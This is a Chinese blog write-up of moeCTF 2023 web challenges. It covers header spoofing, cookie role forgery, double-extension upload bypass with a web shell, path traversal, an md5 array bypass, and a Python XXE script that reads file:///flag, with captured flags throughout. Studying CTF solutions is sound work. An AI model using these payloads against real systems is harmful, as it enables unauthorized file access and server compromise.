@@ -1,0 +1,566 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>moeCTF 2023 | Nanian233🍊's blog</title><meta name="author" content="Nanian233"><meta name="copyright" content="Nanian233"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web&amp;misc wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="moeCTF 2023">
+<meta property="og:url" content="http://example.com/2024/03/08/moeCTF%202023%20wp/index.html">
+<meta property="og:site_name" content="Nanian233🍊&#39;s blog">
+<meta property="og:description" content="web&amp;misc wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuchuang.voooe.cn/images/2024/03/19/ea5a684083a94b068702a9eaf0694f87.webp">
+<meta property="article:published_time" content="2024-03-08T00:54:00.000Z">
+<meta property="article:modified_time" content="2025-02-13T07:17:07.420Z">
+<meta property="article:author" content="Nanian233">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="MISC">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tuchuang.voooe.cn/images/2024/03/19/ea5a684083a94b068702a9eaf0694f87.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "moeCTF 2023",
+  "url": "http://example.com/2024/03/08/moeCTF%202023%20wp/",
+  "image": "https://tuchuang.voooe.cn/images/2024/03/19/ea5a684083a94b068702a9eaf0694f87.webp",
+  "datePublished": "2024-03-08T00:54:00.000Z",
+  "dateModified": "2025-02-13T07:17:07.420Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Nanian233",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/03/08/moeCTF%202023%20wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Nanian233","link":"链接: ","source":"来源: Nanian233🍊's blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'moeCTF 2023',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://tuchuang.voooe.cn/images/2024/03/19/ea5a684083a94b068702a9eaf0694f87.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Nanian233🍊's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">moeCTF 2023</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">moeCTF 2023</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-08T00:54:00.000Z" title="发表于 2024-03-08 08:54:00">2024-03-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-13T07:17:07.420Z" title="更新于 2025-02-13 15:17:07">2025-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/write-up/">write up</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p>http 认证绕过</p>
+<p><img src="https://s2.loli.net/2024/03/07/YgWQ4tbinMBTz1e.png"></p>
+<p><strong>按照要求完成五个任务即可<br>Payload:<br>GET:UwU&#x3D;u<br>POST:Luv&#x3D;u<br>cookie:character&#x3D;admin<br>x-forwarded-for:127.0.0.1<br>User-Agent: MoeBrowser<br>除Post外其余都得在Upgrade上面</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/1ZvxywaKkHuVYsN.png"></p>
+<p><strong>moectf{basic_http_knowledge_I-MHSmMgztyYeW4SgAbRP4Fyu0Qx13Or}</strong></p>
+<h3 id="web-入门指北"><a href="#web-入门指北" class="headerlink" title="web 入门指北"></a>web 入门指北</h3><p>hex base64</p>
+<p><img src="https://s2.loli.net/2024/03/07/urbixDJzCAcHwsp.png"></p>
+<p>先hex再base64</p>
+<p><img src="https://s2.loli.net/2024/03/07/Jh7tRx3wzMaViYA.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/LQwOAH6nmtd2IMv.png"></p>
+<p><strong>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</strong></p>
+<h3 id="彼岸的-flag"><a href="#彼岸的-flag" class="headerlink" title="彼岸的 flag"></a>彼岸的 flag</h3><p>源码泄露</p>
+<p><img src="https://s2.loli.net/2024/03/07/pcXbdqvyxJm1g6o.png"></p>
+<p><strong>一开始以为是啥，原来就是源码泄露<br>在管理员撤回的信息这里有flag的注释</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/ZN1nl564W7DyfYo.png"></p>
+<p><strong>moectf{find_comments_9qv7ywbgbwCasdsfanngjHxGfgQVUKIw}</strong></p>
+<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>伪造 token</p>
+<p>题目有附件</p>
+<p><img src="https://s2.loli.net/2024/03/07/yMXczOQrwAW34Fe.png"></p>
+<p>按照方法先注册并且登录后访问&#x2F;flag<br>**头：POST &#x2F;register **<br><img src="https://s2.loli.net/2024/03/07/AQR18OnWkxaYZtp.png"></p>
+<p>显示用户已存在，我们使用自己的账号</p>
+<p><img src="https://s2.loli.net/2024/03/07/Z9rguwGd2IqkDOp.png"></p>
+<p>然后登录</p>
+<p><img src="https://s2.loli.net/2024/03/07/XkoV7uz9sC3xrLS.png"></p>
+<p>这个是 base64 加密的</p>
+<p>解密为：{“username”: “nanian”, “password”: “123456”, “role”: “user”}</p>
+<p>放包后手动跳转到&#x2F;flag</p>
+<p><img src="https://s2.loli.net/2024/03/07/VsnZ3g1Jr8wvte9.png"></p>
+<p>flag{sorry_but_you_are_not_admin}</p>
+<p>这个假 flag 提示了我们 role 可能要改成 admin（毕竟只有这个是新出来的东西）</p>
+<p>{“username”: “nanian”, “password”: “123456”, “role”: “admin”} base64 encode</p>
+<p><img src="https://s2.loli.net/2024/03/07/FnKAmPOaeBMcCrx.png"></p>
+<p>放入浏览器的 cookie 的 token 里就行</p>
+<p>再次访问&#x2F;flag</p>
+<p><img src="https://s2.loli.net/2024/03/07/qyXTsH5eRwCzaFO.png"></p>
+<p><strong>moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}</strong></p>
+<h3 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h3><p>   web 脚本</p>
+<p><img src="https://s2.loli.net/2024/03/07/jLgrm8qx5iflzAC.png"></p>
+<p><strong>开始游戏会给出题目，然后对应题目选择正确的选项答案即可，关键在于有时间限制，所以需要编写脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="string">&#x27;http://localhost:11499/&#x27;</span>  <span class="comment">#URL</span></span><br><span class="line">session=requests.Session()</span><br><span class="line">fx = <span class="number">0</span></span><br><span class="line">sd = <span class="number">0</span></span><br><span class="line">data=&#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:fx,<span class="string">&quot;throttle&quot;</span>:sd&#125;</span><br><span class="line">re=session.post(url=url,data=data)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;向左&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      fx=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;向右&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      fx=-<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;弯道直行&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      fx=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;抓地力太小了&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      sd=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;抓地力太大了&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      sd=<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;保持这个速度&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">      sd=<span class="number">1</span></span><br><span class="line">    soup = BeautifulSoup(re.content, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    info_div = soup.find(<span class="string">&quot;div&quot;</span>, &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;info&quot;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(info_div.text)</span><br><span class="line">    data=&#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:fx,<span class="string">&quot;throttle&quot;</span>:sd&#125;</span><br><span class="line">    re=session.post(url=url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="comment">#来自紫竹编写的脚本~</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/03/07/kCNA6QDetFR57Sq.png"></p>
+<p><strong>moectf{Beautiful_Drifting!!_nUhVFFm2dbVI7EU7NC0_F4dDz-n6jjQ7}</strong></p>
+<h3 id="moe-图床"><a href="#moe-图床" class="headerlink" title="moe 图床"></a>moe 图床</h3><p>文件上传  双后缀绕过 源码泄露</p>
+<p><img src="https://s2.loli.net/2024/03/07/grleyPDBakRwn2t.png"></p>
+<p><strong>先正常上传一个文件</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/D3Enr926qxeA4Tu.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/R6NvgJcDMOdPwlf.png"></p>
+<p><strong>发现调用了 upload.php，访问一下</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/H7CNgSXYbjEeKMv.png"></p>
+<p><strong>源码泄露，抓住重点位置</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/rv8I3eZ5su6Gjfb.png"></p>
+<p>比如我上传 muma.png.php 的话</p>
+<p>explode()：把它们分成 muma   png   php 三段</p>
+<p>然后 count 计数为 3&gt;2 进入 if 内，然后让 segment&#x3D;第二个位置也就是 png，再进第二个 if 里判断是否为 png</p>
+<p><img src="https://s2.loli.net/2024/03/07/KwH5qfRLDdkXy13.png"></p>
+<p><strong>还要注意文件大小和类型。</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/gJ8shH4VfEQ1jS7.png"></p>
+<p><strong>这里上传一个正常图片，然后改文件名和内容即可</strong></p>
+<p><strong>蚁剑连接 key 为 1，在根目录找到 flag</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/JxABm6nqFQTjOUP.png"></p>
+<p><strong>moectf{hmmm_improper_filter_G_x2kN18o5IQp_fuYySgbw6IUVvvU_Sm}</strong></p>
+<h3 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h3><p>xxe</p>
+<p><img src="https://s2.loli.net/2024/03/07/4kVsdNJYDpqEKGL.png"></p>
+<p>提示 flag 在根目录中，抓包以下</p>
+<p><img src="https://s2.loli.net/2024/03/07/iWZ3EApPLjVfR6U.png"></p>
+<p>xxe 还没学，关键点在下图</p>
+<p><img src="https://s2.loli.net/2024/03/07/lOKENPSBwLJnQgj.png"></p>
+<p>直接套 m 神脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;localhost:52776&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;multipart/form-data; boundary=---------------------------15719226131077920622631907538&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;null&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;document&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;navigate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;cross-site&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="string">&#x27;?1&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;-----------------------------15719226131077920622631907538</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;xml_content&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/xml</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="string">    &lt;!ENTITY b SYSTEM &quot;file:///flag&quot; &gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;xml&gt;&lt;name&gt;&amp;b;&lt;/name&gt;&lt;/xml&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------15719226131077920622631907538--</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(<span class="string">&#x27;xxx网址位置xxx&#x27;</span>, headers=headers, data=data)   <span class="comment">#URL</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/03/07/RMuGlLpY38UoWNq.png"></p>
+<p><strong>moectf{Which_one_You’ve_Chosen?0n8i1NDyjS2SD5yAUtpdBqqvH8vXFeSu}</strong></p>
+<h3 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h3><p>URL 爆破</p>
+<p><img src="https://s2.loli.net/2024/03/07/V62NBRZhjKSOnJv.png"></p>
+<p>按照要求先进&#x2F;?id&#x3D;1 看看</p>
+<p><img src="https://s2.loli.net/2024/03/07/E4K6unDiTmJRfqY.png"></p>
+<p>跟彼岸的 flag 一样属于源码泄露，只不过这次要爆破从 1-1000 的 URL，只有一个里面有 flag</p>
+<p><strong>BP抓包后到Intruder加变量，再加一个1-1000的字典然后爆破即可</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/vMPq4ARL58ihUKG.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">desktop_path = <span class="string">&quot;xxx&quot;</span>  <span class="comment"># 替换为您的路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;desktop_path&#125;</span>/number_dictionary.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1001</span>):</span><br><span class="line">        file.write(<span class="built_in">str</span>(number) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#数字字典脚本</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/03/07/4ChklfrMBZ2yPdt.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/jbVulq2ewCL4aK7.png"></p>
+<p><strong>找到一个不同长度的进去搜索moectf即可得到flag</strong><br><strong>还可以使用py脚本遍历网址查看html找moectf关键词然后输出其注释内容</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/H4uvgIXMjVbomFn.png"></p>
+<blockquote>
+<p>来自 chatgpt 写的脚本</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup, Comment</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_moectf</span>(<span class="params">comment</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;moectf&quot;</span> <span class="keyword">in</span> comment</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    base_url = <span class="string">&quot;https://example.com/?id=&quot;</span>  <span class="comment">#添加自己的URL</span></span><br><span class="line">    found_moectf = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> id_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1001</span>):</span><br><span class="line">        url = base_url + <span class="built_in">str</span>(id_num)</span><br><span class="line">        response = requests.get(url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            soup = BeautifulSoup(response.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">            comments = soup.find_all(string=<span class="keyword">lambda</span> text: <span class="built_in">isinstance</span>(text, Comment))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> index, comment <span class="keyword">in</span> <span class="built_in">enumerate</span>(comments, start=<span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Comment <span class="subst">&#123;index&#125;</span> at <span class="subst">&#123;url&#125;</span> (ID: <span class="subst">&#123;id_num&#125;</span>): <span class="subst">&#123;comment&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> found_moectf <span class="keyword">and</span> check_for_moectf(comment):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Found &#x27;moectf&#x27; in comment at <span class="subst">&#123;url&#125;</span> (ID: <span class="subst">&#123;id_num&#125;</span>): <span class="subst">&#123;comment&#125;</span>&quot;</span>)</span><br><span class="line">                    found_moectf = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span>  <span class="comment"># 找到后立即结束当前页面的注释检查</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Failed to fetch the webpage at <span class="subst">&#123;url&#125;</span>.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 添加时间间隔，模拟正常的访问速度</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)  <span class="comment"># 在每个请求之后等待1秒</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> found_moectf:</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 找到 moectf 后立即结束整体检查</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><strong>moectf{script_helps_QKmIks5AEfKv4t-VhXQvlIGufYuK5bLp}</strong></p>
+<h3 id="meo-图床"><a href="#meo-图床" class="headerlink" title="meo 图床"></a>meo 图床</h3><p>   file_get_contents()  php 弱类型比较</p>
+<p><img src="https://s2.loli.net/2024/03/07/sPjDJKLeF8ulYbS.png"></p>
+<p>正常流程上传图片之后</p>
+<p><img src="https://s2.loli.net/2024/03/07/ZwBgreHDSq2Yy3L.png"></p>
+<p><strong>经过 bp 抓包发现 name 参数里的值为文件名，改成 flag 看回显</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/CUqxgEFWm3QnTzu.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/bI4Q1vGXxShqJDe.png"></p>
+<p><strong>尝试..&#x2F;，最后在根目录处得到提示</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/GSzMH6iYAaqu4tx.png"></p>
+<p><strong>直接访问 URL&#x2F;Fl3g_n0t_Here_dont_peek!!!!!.php</strong></p>
+<p><img src="/bYGmjoxiRVx"></p>
+<p><strong>简单弱类型md5比较，直接数组绕过<br>?param1[]&#x3D;1&amp;param2[]&#x3D;2</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/rvDulM1423YCp5R.png"></p>
+<p><strong>moectf{oops_file_get_contents_controllable_Vr83kqkQn07GeQ_FSCvDh_-KAXgF7mLP}</strong></p>
